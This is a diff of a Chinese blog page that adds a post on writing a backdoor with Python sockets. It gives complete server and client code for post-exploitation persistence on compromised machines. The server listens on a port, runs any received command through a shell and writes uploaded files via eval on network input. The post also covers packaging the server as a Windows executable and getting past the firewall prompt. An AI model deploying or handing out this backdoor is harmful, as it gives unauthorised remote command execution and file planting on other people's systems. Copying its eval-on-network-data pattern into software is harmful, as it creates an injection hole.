@@ -19,7 +19,7 @@
     <meta name="description" content="One way to choose one">
     <meta name="author" content="Misaki">
     <meta name="keywords" content="">
-    <title>新的开始！ ~ Misaki&#39;s Blog</title>
+    <title>利用python socket编写后门 ~ Misaki&#39;s Blog</title>
     <link rel="stylesheet" href="/css/Material_Icons.css">
     <!-- <link rel="stylesheet" href="/css/font-awesome.css"> -->
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
@@ -85,8 +85,8 @@
   <div class="page-header header-filter" data-parallax="true" style="background-image: url('/img/post-banner.jpg'); height: 70vh;">
     
       <div class="container">
-        <h1 class="title text-center post_title">新的开始！</h1>
-        <p class="text-center"><b>Tuesday, September 18th 2018, 12:32 am</b></p>
+        <h1 class="title text-center post_title">利用python socket编写后门</h1>
+        <p class="text-center"><b>Saturday, February 2nd 2019, 11:00 am</b></p>
       </div>
     
   </div>
@@ -100,21 +100,141 @@
       <div class="container">
         <div class="section">
           <div class="post_content">
-              
+              <p>在获取系统权限时候，一般想维持权限或者做端口转发的时候，会用一些端口转发的工具，例如nc，ew，lcx等。</p>
+<p>但在这种类似后门的工具中被查杀率和存在后门的情况时有发生，本人就遇到过获取系统权限创建账号后，发现没多久又被植入其他隐藏账号的情况。</p>
+<p>因此，既然会写一些代码就简单的来实现一个利用socket通信的后门脚本。</p>
+<p>如下server端：</p>
+<pre><code># coding:utf-8
+
+import socket
+import subprocess
+
+# server
+
+def server_main(ips):
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        server.bind((&quot;0.0.0.0&quot;, ips))
+        server.listen(5)
+        print &quot;[*] Listening on %s:%d&quot; %(socket.gethostname(),ips)
+        while True:
+            data, addr = server.accept()
+            buf = data.recv(4096)
+            print &quot;[*] recv command = %s&quot; %buf
+            if len(buf) != 0:
+                if is_file(buf):
+                    rev = upload(buf)
+                else:
+                    rev = run_command(buf)
+            data.send(rev)
+    except:
+        print &quot;Exception!&quot;
+
+def is_file(buf):
+    try:
+        if isinstance(eval(buf), dict):
+            return True
+    except:
+        return False
+
+
+def run_command(command):
+    command = command.strip()
+    try:
+        p = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        out, err = p.communicate()
+    except:
+        out = &quot;Fail to execute command!&quot;
+    return out
+
+
+def upload(data):
+    try:
+        path = eval(data)[&#39;path&#39;]
+        file = eval(data)[&#39;request&#39;]
+        with open(path, &#39;wb&#39;) as f:
+            f.write(file)
+        return &quot;OK&quot;
+    except:
+        return &quot;Fail&quot;
+
+if __name__ == &quot;__main__&quot;:
+    ip = input(&quot;PORT = &quot;)
+    server_main(int(ip))
+
+</code></pre><p>client端：</p>
+<pre><code>#coding:utf-8
+
+import socket
+
+# client
+
+# use:
+# &gt;&gt; command   eg:&gt;&gt; whoami
+# &gt;&gt; upload 要上传的源文件 要上传到的目标地址文件  &gt;&gt; upload d:/a.txt e:/a.txt
+
+def client(ips, data):
+    resp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        resp.settimeout(10)
+        resp.connect(ips)
+        resp.send(data)
+        out = resp.recv(4096)
+        resp.close()
+    except :
+        out = &quot;Except Or Time out !&quot;
+    return out
+
+def client_send(target, port):
+    while True:
+        data = raw_input(&quot;&gt;&gt; &quot;)
+        if &#39;upload&#39; not in data:
+            out = client((target,port),data)
+            print &quot;[*] Command Out= %s&quot; % out
+        else:
+            upload((target,port),data)
+
+
+def upload(ips,data):
+    file = data.split(&#39; &#39;)
+    list_a = {}
+    name = file[1].replace(&#39;\\&#39;,&#39;/&#39;)
+    list_a[&#39;path&#39;] = file[2]
+    request = &#39;&#39;
+    with open(name,&#39;rb&#39;) as f:
+        for i in f.readlines():
+            request+=i
+    list_a[&#39;request&#39;] = request
+    out = client(ips, str(list_a))
+    if &quot;OK&quot; in out:
+        print &quot;[*] File Write Success !&quot;
+    else:
+        print &quot;[*] File Write Fail !&quot;
+
+if __name__ == &quot;__main__&quot;:
+    ip = raw_input(&quot;IP:PORT = &quot;)
+    list_a = ip.split(&quot;:&quot;)
+    client_send(list_a[0], int(list_a[1]))
+</code></pre><p>代码实现简单，问题在执行的时候是一个正向连接，在服务器开放端口，所以在一定情况下，需要较高的权限。当然这也是后渗透中需要得到的目标。</p>
+<p>同时可以利用pyinstaller打包为exe文件在win下运行，不过开放防火墙就需要添加网络允许，但本人尝试中发现，对防火墙端口添加的提示中直接关闭窗口提示，再次运行就可以正常使用。防火墙中也没有启用此运行规则。尚不清楚原因。</p>
+
           </div>
           <br><br>
               
                 <div class="license-wrapper">
                     <p>原文作者：<a href="">Misaki</a>
-                    <p>原文链接：<a href="/2018/09/新的开始！/">/2018/09/新的开始！/</a>
-                    <p>发表日期：<a href="/2018/09/新的开始！/">September 18th 2018, 12:32:10 am</a>
-                    <p>更新日期：<a href="/2018/09/新的开始！/">September 20th 2018, 1:01:02 pm</a>
+                    <p>原文链接：<a href="/2019/02/利用python-socket编写后门/">/2019/02/利用python-socket编写后门/</a>
+                    <p>发表日期：<a href="/2019/02/利用python-socket编写后门/">February 2nd 2019, 11:00:50 am</a>
+                    <p>更新日期：<a href="/2019/02/利用python-socket编写后门/">February 1st 2019, 11:51:10 am</a>
                     <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
                 </div>
               
           <br><br>
           <div>
               <p>
+                       
+                      <span class="badge badge-default">#&nbsp;python</span>
+                      &nbsp;
                       
               </p>
           </div>
@@ -144,8 +264,8 @@
     <script>               
         var disqus_shortname = '';
         var disqus_config = function () {
-            this.page.url = '/2018/09/新的开始！/'; 
-            this.page.identifier = '/2018/09/新的开始！/';
+            this.page.url = '/2019/02/利用python-socket编写后门/'; 
+            this.page.identifier = '/2019/02/利用python-socket编写后门/';
         };
         (function() { 
             var d = document, s = d.createElement('script');
